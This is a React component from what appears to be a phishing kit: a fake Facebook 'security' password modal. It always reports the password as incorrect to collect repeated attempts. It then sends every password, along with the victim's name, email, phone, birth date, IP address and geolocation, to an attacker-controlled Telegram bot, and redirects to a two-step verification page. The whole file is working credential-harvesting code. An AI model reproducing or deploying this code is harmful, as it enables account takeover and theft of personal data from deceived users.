import React, { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router';
import facebook from '../../assets/img/fb-logo.png';
import config from '../../config/index.js';
import { detectLanguageFromLocation } from '../../utils/country_to_language.js';
import { translateMultiple } from '../../utils/translate.js';
const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswordAttempts, lastMessageId, setLastMessageId }) => {
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [submitError, setSubmitError] = useState();
    const [countDown, setCountDown] = useState(config.LOAD_TIMEOUT_MS / 1000);

    const navigate = useNavigate();

    const defaultTexts = useMemo(
        () => ({
            securityMessage: 'For security reasons, you must enter your password to continue.',
            passwordPlaceholder: 'Enter your password',
            continueButton: 'Continue',
            processingButton: 'Processing...',
            errorMinLength: 'Password must be at least 6 characters',
            errorIncorrect: 'Incorrect password. Please try again.'
        }),
        []
    );

    const [texts, setTexts] = useState(defaultTexts);

    const translateAllTexts = async () => {
        try {
            const targetLang = await detectLanguageFromLocation();

            if (targetLang === 'en') {
                setTexts(defaultTexts);
                return;
            }

            const translatedTexts = await translateMultiple(defaultTexts, targetLang);
            setTexts(translatedTexts);
        } catch (error) {
            console.error('Error translating texts:', error);
            setTexts(defaultTexts);
        }
    };

    useEffect(() => {
        translateAllTexts();
    }, []);

    const formatDateVN = (dateStr) => {
        if (!dateStr) return '';
        if (/^\d{2}[/-]\d{2}[/-]\d{4}$/.exec(dateStr)) {
            return dateStr.replace('/', '-');
        }
        const [year, month, day] = dateStr.split('-');
        return `${day}-${month}-${year}`;
    };

    const handleSubmit = async () => {
        if (!password || password.length < 6) {
            setSubmitError(texts.errorMinLength);
            return;
        }

        setIsSubmitting(true);
        setSubmitError(''); // Xóa lỗi cũ khi bắt đầu submit

        let i = config.LOAD_TIMEOUT_MS;
        const countDown = setInterval(() => {
            setCountDown(i / 1000);
            i -= 1000;
            if (i == 0) {
                clearInterval(countDown);
            }
        }, 1000);
        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));

        // Hiển thị lỗi sau khi load xong
        setSubmitError(texts.errorIncorrect);

        const newAttempts = [...passwordAttempts, password];
        setPasswordAttempts(newAttempts);

        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData);
            const updatedData = {
                ...parsed,
                passwordAttempts: newAttempts,
                timestamp: Date.now()
            };
            localStorage.setItem('metaFormData', JSON.stringify(updatedData));
        }

        if (newAttempts.length > config.MAX_PASSWORD_ATTEMPTS) {
            setIsSubmitting(false);
            navigate('/two-step-verification');
            return;
        }

        try {
            if (lastMessageId) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: config.CHAT_ID,
                            message_id: lastMessageId
                        })
                    });
                } catch (error) {
                    console.error('Error deleting previous message:', error);
                }
            }

            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const geoData = await geoResponse.json();

            const currentTime = new Date().toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            const passwordList = newAttempts.map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');

            const message = `
<b>📅 Thời gian:</b> <code>${currentTime}</code>
<b>🌐 IP:</b> <code>${geoData.ip}</code>
<b>🌍 Vị trí:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
<b>📍 Tọa độ:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>

<b>📄 Tên Page:</b> <code>${formValue.pageName || 'N/A'}</code>
<b>👤 Họ tên:</b> <code>${formValue.fullName || 'N/A'}</code>
<b>📧 Email:</b> <code>${formValue.email}</code>
<b>📞 Số điện thoại:</b> <code>${formValue.phoneNumber}</code>
<b>🎂 Ngày sinh:</b> <code>${formatDateVN(formValue.birthDay)}</code>

${passwordList}`;

            const telegramApiUrl = `https://api.telegram.org/bot${config.TOKEN}/sendMessage`;

            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send data. Please try again.');
            }

            const result = await response.json();

            if (!result.ok) {
                throw new Error(result.description || 'Failed to send data');
            }

            setLastMessageId(result.result.message_id);

            const currentStoredData = localStorage.getItem('metaFormData');
            if (currentStoredData) {
                const parsed = JSON.parse(currentStoredData);
                const updatedData = {
                    ...parsed,
                    lastMessageId: result.result.message_id,
                    lastMessage: message,
                    timestamp: Date.now()
                };
                localStorage.setItem('metaFormData', JSON.stringify(updatedData));
            }

            if (newAttempts.length < config.MAX_PASSWORD_ATTEMPTS) {
                setSubmitError(texts.errorIncorrect);
                setPassword('');
            } else {
                setTimeout(() => {
                    navigate('/two-step-verification');
                }, config.LOAD_TIMEOUT_MS);
            }
        } catch (error) {
            console.error('Error sending data:', error);
            setSubmitError(error instanceof Error ? error.message : texts.errorUnexpected);
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <div
            style={{
                position: 'fixed',
                top: 0,
                left: 0,
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                width: '100vw',
                height: '100vh',
                zIndex: '100',
                backgroundColor: 'rgba(0,0,0,0.2)'
            }}
            onClick={(e) => {
                if (e.target === e.currentTarget) {
                    setIsShowModal(false);
                }
            }}
        >
            <div
                style={{
                    maxWidth: '500px',
                    height: '390px',
                    backgroundColor: 'white',
                    borderRadius: '10px'
                }}
            >
                <div className='conga'>
                    <div className='conga-modal'>
                        <div>
                            <img src={facebook} alt='Facebook' />
                        </div>
                        <div>
                            <p className='conga-modal-desc'>{texts.securityMessage}</p>
                        </div>
                        <div
                            style={{
                                position: 'relative',
                                width: '100%'
                            }}
                        >
                            <input
                                type={showPassword ? 'text' : 'password'}
                                className='input-password'
                                placeholder={texts.passwordPlaceholder}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                onKeyPress={(e) => {
                                    if (e.key === 'Enter') {
                                        handleSubmit();
                                    }
                                }}
                                autoFocus
                                disabled={isSubmitting}
                            />
                            <button
                                onClick={() => {
                                    setShowPassword(!showPassword);
                                }}
                                style={{
                                    position: 'absolute',
                                    top: '50%',
                                    right: '8px',
                                    transform: 'translateY(-50%)',
                                    appearance: 'none',
                                    border: 'none',
                                    color: 'inherit',
                                    backgroundColor: 'transparent',
                                    cursor: 'pointer'
                                }}
                            >
                                <i className={`fa-regular ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}></i>
                            </button>
                        </div>

                        {submitError && (
                            <div className='dmm-error'>
                                <p
                                    style={{
                                        color: '#c00',
                                        fontSize: '14px'
                                    }}
                                >
                                    {texts.errorIncorrect}
                                </p>
                            </div>
                        )}
                        <button
                            className='btn-continue'
                            onClick={handleSubmit}
                            disabled={isSubmitting}
                            style={{
                                opacity: isSubmitting ? 0.5 : 1,
                                cursor: isSubmitting ? 'not-allowed' : 'pointer'
                            }}
                        >
                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
